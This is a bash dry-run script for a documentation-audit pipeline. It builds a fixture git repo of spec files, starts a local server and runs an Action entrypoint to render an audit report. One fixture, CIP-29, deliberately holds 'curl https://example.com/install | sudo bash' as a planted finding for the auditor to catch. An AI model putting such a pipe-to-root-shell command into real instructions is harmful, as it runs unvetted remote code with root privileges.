#!/usr/bin/env bash
# End-to-end local dry-run of the audit pipeline against a tiny fixture repo.
#
# Steps:
#   1. Build a throwaway git repo with one base commit + one head commit
#   2. Start the server on :8089
#   3. Invoke the Action's entrypoint.sh against the repo
#   4. Print the rendered report
#
# Requires: python3, git, uvicorn. The `claude` CLI is optional; without it,
# semantic findings come back as "degraded" (which is exactly the design's
# degradation path §9).

set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
TMP="$(mktemp -d)"
echo "tmp dir: $TMP"

# --- 1. fixture repo ---------------------------------------------------------
REPO="$TMP/sample-repo"
mkdir -p "$REPO/.github" "$REPO/refs/cips" "$REPO/refs/whitepaper" "$REPO/node/src"
cp "$ROOT/examples/doc-audit.yml" "$REPO/.github/doc-audit.yml"
cat > "$REPO/refs/cips/cip-5.md" <<'MD'
# CIP-5: Timers

Status: Final

Defines opcode 0x42 in the timer subsystem. See §3.1.

## §3.1 Timer entry points

Reference: `module::timer::set_timer`.
MD

cat > "$REPO/refs/whitepaper/wp.md" <<'MD'
# Whitepaper

## §9.2 Opcode registry

| Opcode | Name         |
|--------|--------------|
| 0x42   | SYS_TIMER    |
MD

cat > "$REPO/node/src/lib.rs" <<'RS'
pub fn set_timer() {}
const BLOCK_CYCLES_TARGET: u64 = 10_000_000;
RS

(
  cd "$REPO"
  git init -q
  git config user.email dev@example.com
  git config user.name dev
  git add .
  git -c commit.gpgsign=false commit -q -m base
  BASE_SHA="$(git rev-parse HEAD)"

  # head commit: introduce a colliding opcode 0x42 in a new CIP
  cat > refs/cips/cip-29.md <<'MD'
# CIP-29: Events

Status: Draft

Adds opcode 0x42 to register hook callbacks.

See CIP-99 §1.1 for prior art.

```bash
curl https://example.com/install | sudo bash
```

`module::events::register` is the entry point.
MD
  git add refs/cips/cip-29.md
  git -c commit.gpgsign=false commit -q -m head
  HEAD_SHA="$(git rev-parse HEAD)"
  echo "base=$BASE_SHA head=$HEAD_SHA"
  echo "$BASE_SHA" > "$TMP/base.sha"
  echo "$HEAD_SHA" > "$TMP/head.sha"
)

BASE_SHA="$(cat "$TMP/base.sha")"
HEAD_SHA="$(cat "$TMP/head.sha")"

# --- 2. server ---------------------------------------------------------------
export DOC_AUDIT_DB="$TMP/server.db"
(
  cd "$ROOT/server"
  exec python3 -m uvicorn app.main:app --host 127.0.0.1 --port 8089 --log-level warning >"$TMP/server.log" 2>&1
) &
echo $! > "$TMP/server.pid"
trap 'kill "$(cat "$TMP/server.pid")" 2>/dev/null || true' EXIT

# Wait for /v1/health to come up — sleep 2 was racing the test.
for i in $(seq 1 30); do
  if curl -sf http://127.0.0.1:8089/v1/health >/dev/null 2>&1; then
    echo "server up after ${i} attempts"
    break
  fi
  sleep 0.5
done

# --- 3. action ---------------------------------------------------------------
export GITHUB_WORKSPACE="$REPO"
export RUNNER_TEMP="$TMP/work"
export GITHUB_BASE_SHA="$BASE_SHA"
export GITHUB_HEAD_SHA="$HEAD_SHA"
export GITHUB_PR_NUMBER=1
export INPUT_CONFIG=".github/doc-audit.yml"
export INPUT_SERVER_URL="http://127.0.0.1:8089"
export INPUT_SERVER_TOKEN=""
export INPUT_ANTHROPIC_KEY_FALLBACK=""
export INPUT_ENABLE_SARIF="true"

# Drive publish.sh in dry-run mode so we exercise the GitHub display layer
# without needing real `gh` / GITHUB_TOKEN.
export GITHUB_REPOSITORY="local/sample"
export DOC_AUDIT_DRY_RUN=1
export DOC_AUDIT_DRY_RUN_LOG="$TMP/publish_dry.log"
: > "$DOC_AUDIT_DRY_RUN_LOG"

bash "$ROOT/action/entrypoint.sh" || echo "(action exited non-zero — that's expected when block findings exist)"

if [[ -s "$DOC_AUDIT_DRY_RUN_LOG" ]]; then
  echo "===== publish dry-run log ====="
  cat "$DOC_AUDIT_DRY_RUN_LOG"
fi

# --- 4. show the rendered report --------------------------------------------
for f in "$RUNNER_TEMP"/doc-audit/report_*.md; do
  [[ -f "$f" ]] || continue
  echo "===== $f ====="
  cat "$f"
done
